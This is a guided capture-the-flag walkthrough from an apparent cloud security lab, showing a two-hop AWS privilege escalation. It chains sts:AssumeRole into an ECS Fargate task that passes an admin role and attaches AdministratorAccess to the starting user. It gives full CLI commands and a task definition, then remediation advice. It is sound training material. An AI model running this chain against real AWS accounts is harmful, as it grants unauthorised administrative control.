# Guided Walkthrough: Multi-Hop Privilege Escalation via AssumeRole and ECS Fargate

This scenario demonstrates a sophisticated two-hop privilege escalation attack that chains role assumption with Amazon ECS Fargate exploitation. The attack path exploits a common pattern where users are granted the ability to assume roles for operational purposes, and those roles have overly permissive ECS and IAM PassRole permissions that can be abused to gain administrative access.

In the first hop, an attacker with `sts:AssumeRole` permission assumes an intermediate role that has been configured with ECS management capabilities. This initial role assumption is often considered low-risk because the role itself doesn't have direct administrative permissions. However, the combination of `iam:PassRole`, `ecs:CreateCluster`, `ecs:RegisterTaskDefinition`, and `ecs:RunTask` permissions creates a dangerous privilege escalation opportunity.

The second hop leverages these ECS permissions to create infrastructure that executes with elevated privileges. The attacker creates an ECS cluster, registers a task definition that specifies an administrative role as the task role, and then runs the task on Fargate. When the task executes, it receives temporary credentials for the administrative role through the ECS credential provider. The container can then use those credentials to grant admin access to the starting user.

This attack chain is particularly insidious because ECS is a legitimate service for running containerized workloads, and the individual permissions involved are commonly granted for DevOps and automation purposes. Organizations often overlook this privilege escalation path because it requires multiple steps and relies on understanding how ECS task roles work.

## The Challenge

You start as `pl-prod-sts001-ecs002-starting-user`, an IAM user with a single meaningful permission: `sts:AssumeRole` on `pl-prod-sts001-ecs002-intermediate-role`. You cannot list IAM users, you cannot touch ECS, and you definitely cannot call `iam:AttachUserPolicy` on yourself. From this position, you need to reach full administrative access.

The path runs through two hops:

1. **Hop 1**: Assume `pl-prod-sts001-ecs002-intermediate-role` using `sts:AssumeRole`
2. **Hop 2**: Use the intermediate role's ECS and PassRole permissions to launch a Fargate task that runs as `pl-prod-sts001-ecs002-admin-role` and attaches `AdministratorAccess` to your starting user

Your Terraform outputs contain the starting user's access key credentials. The region is also available from Terraform outputs.

## Reconnaissance

Before jumping into exploitation, it's worth understanding what you're working with. With the starting user credentials configured, confirm your identity and verify you lack admin permissions:

```bash
export AWS_ACCESS_KEY_ID="<starting_user_access_key_id>"
export AWS_SECRET_ACCESS_KEY="<starting_user_secret_access_key>"
unset AWS_SESSION_TOKEN

# Confirm identity
aws sts get-caller-identity --query 'Arn' --output text
# Expected: arn:aws:iam::ACCOUNT_ID:user/pl-prod-sts001-ecs002-starting-user

# Confirm you lack admin access
aws iam list-users --max-items 1
# Expected: AccessDenied
```

If you have helpful permissions like `iam:ListRoles` and `iam:GetRole`, you can enumerate what roles are assumable and inspect their permissions before committing to the path:

```bash
# List roles to find assumable targets
aws iam list-roles --query 'Roles[?contains(RoleName, `sts001`)].RoleName'

# Inspect the intermediate role's trust policy
aws iam get-role --role-name pl-prod-sts001-ecs002-intermediate-role \
    --query 'Role.AssumeRolePolicyDocument'

# List what permissions the intermediate role has
aws iam list-role-policies --role-name pl-prod-sts001-ecs002-intermediate-role
aws iam list-attached-role-policies --role-name pl-prod-sts001-ecs002-intermediate-role
```

The trust policy will show your starting user can assume it, and the attached/inline policies will reveal the ECS management and `iam:PassRole` permissions on the admin role. That's your signal — the two-hop path is right there.

## Exploitation

### Hop 1: Assume the Intermediate Role

Use `sts:AssumeRole` to swap your starting user credentials for temporary credentials belonging to the intermediate role:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)

ROLE_CREDS=$(aws sts assume-role \
    --role-arn "arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-sts001-ecs002-intermediate-role" \
    --role-session-name privesc-session \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $ROLE_CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $ROLE_CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $ROLE_CREDS | jq -r '.SessionToken')

# Confirm new identity
aws sts get-caller-identity --query 'Arn' --output text
# Expected: arn:aws:iam::ACCOUNT_ID:assumed-role/pl-prod-sts001-ecs002-intermediate-role/privesc-session
```

You are now the intermediate role. You still can't call `iam:ListUsers` directly — the intermediate role doesn't have broad admin permissions. But you can create ECS infrastructure, and critically, you can pass the admin role to a task definition.

### Hop 2: Create ECS Infrastructure and Escalate

The intermediate role has `ecs:CreateCluster`, `ecs:RegisterTaskDefinition`, `ecs:RunTask`, and `iam:PassRole` on the admin role. Together these permissions let you spin up a container that runs with administrative credentials and uses them to modify IAM on your behalf.

**Step 1: Create an ECS cluster**

```bash
AWS_REGION="us-east-1"  # or your region from Terraform outputs
CLUSTER_NAME="pl-prod-sts001-ecs002-attack-cluster"

aws ecs create-cluster \
    --region $AWS_REGION \
    --cluster-name "$CLUSTER_NAME"
```

**Step 2: Find Fargate network configuration**

Fargate tasks require a VPC subnet. The default VPC works fine:

```bash
VPC_ID=$(aws ec2 describe-vpcs \
    --region $AWS_REGION \
    --filters "Name=is-default,Values=true" \
    --query 'Vpcs[0].VpcId' \
    --output text)

SUBNET_ID=$(aws ec2 describe-subnets \
    --region $AWS_REGION \
    --filters "Name=vpc-id,Values=$VPC_ID" \
    --query 'Subnets[0].SubnetId' \
    --output text)

echo "VPC: $VPC_ID / Subnet: $SUBNET_ID"
```

**Step 3: Register a task definition with the admin role**

This is the core of the escalation. You use `iam:PassRole` to attach `pl-prod-sts001-ecs002-admin-role` as the task role. Any container in this task definition automatically receives temporary credentials for that role via the ECS credential provider endpoint at `169.254.170.2`. The container command directly calls `iam:AttachUserPolicy` using those admin credentials to grant `AdministratorAccess` to your starting user:

```bash
ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-sts001-ecs002-admin-role"
STARTING_USER="pl-prod-sts001-ecs002-starting-user"
TASK_FAMILY="pl-sts001-ecs002-admin-escalation"

TASK_DEF='{
  "family": "'$TASK_FAMILY'",
  "networkMode": "awsvpc",
  "requiresCompatibilities": ["FARGATE"],
  "cpu": "256",
  "memory": "512",
  "taskRoleArn": "'$ADMIN_ROLE_ARN'",
  "executionRoleArn": "'$ADMIN_ROLE_ARN'",
  "containerDefinitions": [
    {
      "name": "escalation-container",
      "image": "amazon/aws-cli:latest",
      "essential": true,
      "command": [
        "iam",
        "attach-user-policy",
        "--user-name",
        "'$STARTING_USER'",
        "--policy-arn",
        "arn:aws:iam::aws:policy/AdministratorAccess"
      ],
      "logConfiguration": {
        "logDriver": "awslogs",
        "options": {
          "awslogs-create-group": "true",
          "awslogs-group": "/ecs/'$TASK_FAMILY'",
          "awslogs-region": "'$AWS_REGION'",
          "awslogs-stream-prefix": "ecs"
        }
      }
    }
  ]
}'

aws ecs register-task-definition \
    --region $AWS_REGION \
    --cli-input-json "$TASK_DEF"
```

**Step 4: Run the task**

```bash
TASK_ARN=$(aws ecs run-task \
    --region $AWS_REGION \
    --cluster "$CLUSTER_NAME" \
    --task-definition "$TASK_FAMILY" \
    --launch-type FARGATE \
    --network-configuration "awsvpcConfiguration={subnets=[$SUBNET_ID],assignPublicIp=ENABLED}" \
    --query 'tasks[0].taskArn' \
    --output text)

echo "Task ARN: $TASK_ARN"
```

**Step 5: Wait for the task to complete**

Fargate cold starts take 30-90 seconds. Poll until the task stops:

```bash
echo "Waiting for task to complete..."
aws ecs wait tasks-stopped \
    --region $AWS_REGION \
    --cluster "$CLUSTER_NAME" \
    --tasks "$TASK_ARN"

# Check exit code
EXIT_CODE=$(aws ecs describe-tasks \
    --region $AWS_REGION \
    --cluster "$CLUSTER_NAME" \
    --tasks "$TASK_ARN" \
    --query 'tasks[0].containers[0].exitCode' \
    --output text)

echo "Container exit code: $EXIT_CODE"
# 0 = success; the admin policy was attached
```

## Verification

Switch back to your starting user credentials and confirm that `AdministratorAccess` was attached:

```bash
# Restore starting user credentials
export AWS_ACCESS_KEY_ID="<starting_user_access_key_id>"
export AWS_SECRET_ACCESS_KEY="<starting_user_secret_access_key>"
unset AWS_SESSION_TOKEN

# Allow IAM policy propagation
sleep 15

# Confirm admin access
aws iam list-users --max-items 3 --output table
aws sts get-caller-identity
```

If `iam:ListUsers` succeeds, you have full administrative access. The ECS task used the admin role's credentials (injected automatically by the ECS credential provider) to call `iam:AttachUserPolicy` on your behalf.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now granted to your starting user provides implicitly.

Using your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/sts-001-to-ecs-002-to-admin-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

The escalation worked because three conditions were simultaneously true:

1. The starting user could assume a role (`sts:AssumeRole`) — a commonly granted DevOps permission
2. That role could pass an admin role to ECS (`iam:PassRole`) and create/run tasks — also commonly granted for container platform teams
3. The admin role trusted `ecs-tasks.amazonaws.com` — meaning ECS could assume it on behalf of any authorized task definition

None of these facts alone looks alarming. Together, they form a complete privilege escalation path that bypasses every direct IAM guard. The attack never called `iam:AttachUserPolicy` as the starting user — it outsourced that call to a container running with credentials the attacker was never directly issued.

In real environments this pattern appears whenever a "deployment role" or "ECS operator role" is granted PassRole without restricting which roles it can pass, and when administrative roles are left trusting `ecs-tasks.amazonaws.com` for convenience. The fix requires both restricting PassRole with conditions and removing broad service principal trust from privileged roles.
